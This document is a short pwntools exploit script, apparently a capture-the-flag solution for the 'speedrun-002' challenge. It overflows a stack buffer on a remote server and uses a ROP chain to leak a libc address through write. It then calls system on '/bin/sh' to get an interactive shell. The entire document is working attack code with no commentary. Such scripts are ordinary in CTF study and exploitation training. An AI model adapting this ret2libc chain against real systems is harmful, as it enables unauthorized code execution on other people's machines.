from pwn import *

POP_RDI = 0x4008a3
POP_RSI_POP_R15 = 0x4008a1
POP_RDX = 0x4006ec

target = ELF('./speedrun-002')

# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('../libc6_2.27-3ubuntu1_amd64.so')
OFFSET_BIN_SH = 0x1b3e9a

# r = process('./speedrun-002')
r = remote('speedrun-002.quals2019.oooverflow.io', 31337)

r.sendlineafter('What say you now?\n', 'Everything intelligent is so boring.')

payload = ''
payload += 'A' * 0x408
payload += p64(POP_RDI)
payload += p64(1)
payload += p64(POP_RSI_POP_R15)
payload += p64(target.got['getenv'])
payload += p64(0)
payload += p64(POP_RDX)
payload += p64(0x8)
payload += p64(target.plt['write'])
payload += p64(0x40074c)
r.sendlineafter('Tell me more.\n', payload)

r.recvuntil('Fascinating.\n')
LIBC_BASE = u64(r.read(8)) - libc.symbols['getenv']
log.info(hex(LIBC_BASE))

r.sendlineafter('What say you now?\n', 'Everything intelligent is so boring.')

payload = ''
payload += 'A' * 0x408
payload += p64(POP_RDI)
payload += p64(LIBC_BASE + OFFSET_BIN_SH)
payload += p64(LIBC_BASE + libc.symbols['system'])
r.sendlineafter('Tell me more.\n', payload)

r.interactive()
